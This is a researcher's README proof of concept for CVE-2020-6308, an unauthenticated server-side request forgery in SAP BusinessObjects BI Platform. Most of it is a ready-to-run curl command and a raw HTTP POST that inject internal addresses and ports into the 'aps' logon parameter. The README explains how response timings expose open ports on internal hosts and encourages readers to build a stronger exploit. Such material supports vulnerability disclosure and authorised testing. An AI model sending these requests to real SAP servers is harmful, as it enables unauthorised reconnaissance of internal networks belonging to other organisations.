# CVE-2020-6308 SAP POC
![Follow on Twitter](https://img.shields.io/twitter/follow/initroott?label=Follow%20&style=social)
![GitHub last commit](https://img.shields.io/github/last-commit/initroot/CVE-2020-6308)
![GitHub stars](https://img.shields.io/github/stars/initroot/CVE-2020-6308)

SAP BusinessObjects Business Intelligence Platform (Web Services) versions - 410, 420, 430, allows an unauthenticated attacker to inject arbitrary values as CMS parameters to perform lookups on the internal network which is otherwise not accessible externally. Follow me on twitter or DM for questions: https://twitter.com/initroott

I reported the issue to SAP in May 2020 and patch released October 2020. You can go ahead and develop your own PoC futher, however, I'll provide a bit of background.
The CMS function doesn't validate the address given. If the host firewall isn't configured correctly, its possible to easily fingerprint for ports or internal network based on responses received from requests. I'll show in the below example how you can see open ports using the CuRL request..
In the below example I have a SAP Host (192.168.0.191), Attacking Machine (192.168.0.149) and another device e.g. internal router (192.168.0.1). 

Our SAP host has the following ports open:

![](https://github.com/InitRoot/CVE-2020-6308/raw/main/image.png)

And our internal router has the following open: 53,80,34573

![](https://github.com/InitRoot/CVE-2020-6308/raw/main/router.png)


So let's test this, we can identify open ports simply based on the timings of the request response. Examples below:

    time curl -i -s -k  -X $'POST' \
        -H $'Host: 192.168.0.191:8080' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:81.0) Gecko/20100101 Firefox/81.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 120' -H $'Origin: http://192.168.0.191:8080' -H $'Connection: close' -H $'Referer: http://192.168.0.191:8080/AdminTools/querybuilder/ie.jsp' -H $'Cookie: JSESSIONID=8EE4AA85EB930DEB7090187F4CB4711B; developer_samples_app_lastusr=admin; developer_samples_app_lastaps=192.168.0.191; developer_samples_app_lastaut=secEnterprise' -H $'Upgrade-Insecure-Requests: 1' \
        -b $'JSESSIONID=8EE4AA85EB930DEB7090187F4CB4711B; developer_samples_app_lastusr=admin; developer_samples_app_lastaps=192.168.0.191; developer_samples_app_lastaut=secEnterprise' \
        --data-binary $'aps=192.168.0.1:53&usr=admin&pwd=&aut=secEnterprise&main_page=ie.jsp&new_pass_page=newpwdform.jsp&exit_page=logonform.jsp' \
        $'http://192.168.0.191:8080/AdminTools/querybuilder/logon?framework='

Testing the following payloads:

* 192.168.0.1:4
* 192.168.0.1:5

Here you can see closed ports test time results, average around 5ms..

![](https://github.com/InitRoot/CVE-2020-6308/raw/main/closedPortsTest.png)

* 192.168.0.1:22
* 192.168.0.1:80

Here you can see open/filtered ports test time results much larger..

![](https://github.com/InitRoot/CVE-2020-6308/raw/main/openPortsTest.png)
![](https://github.com/InitRoot/CVE-2020-6308-PoC/raw/main/SAPWireShark.png)

Now the below isn't ideal, as different routings, some firewalls can impact the results. However, it should give you an idea on where to start building a better exploit.. The above can be adjusted by creating a baseline then working further from there. I'd definitely advise looking at setting up a listener, then seeing what happens.



The below shows how the request will look in Burp with the APS parameter being the vulnearble injection point.
Simpler PoC would be to just inject a canary token value and wait for the trigger..
##  Web Request

    POST /AdminTools/querybuilder/logon?framework= HTTP/1.1
    Host: 192.168.0.191:8080
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:81.0) Gecko/20100101 Firefox/81.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 128
    Origin: http://192.168.0.191:8080
    Connection: close
    Referer: http://192.168.0.191:8080/AdminTools/querybuilder/ie.jsp
    Upgrade-Insecure-Requests: 1

    aps=192.168.0.191&usr=admin&pwd=admin&aut=secEnterprise&main_page=ie.jsp&new_pass_page=newpwdform.jsp&exit_page=logonform.jsp

